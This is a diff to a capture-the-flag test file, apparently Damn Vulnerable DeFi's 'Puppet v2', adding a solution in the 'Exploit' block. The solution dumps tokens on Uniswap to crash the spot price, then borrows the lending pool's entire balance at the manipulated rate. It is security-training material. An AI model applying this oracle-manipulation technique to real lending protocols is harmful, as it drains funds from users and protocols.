@@ -82,6 +82,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+        // swap to decrease the price of DVT
+        const path =  [this.token.address, this.weth.address];
+        const latestBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1000,
+            path,
+            attacker.address,
+            latestBlockTimestamp + 1000
+        );
+        
+        // check eth bal sufficient
+        const ethBal = await ethers.provider.getBalance(attacker.address);
+        const ethForBorrow = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        expect(ethBal.sub(ethers.utils.parseEther('0.1'))).to.be.gte(
+            ethForBorrow
+        );
+        
+        // wrap eth and approve
+        await this.weth.connect(attacker).deposit({value: ethForBorrow});
+        await this.weth.connect(attacker).approve(this.lendingPool.address, ethForBorrow);
+        
+        // borrow all pool balance
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
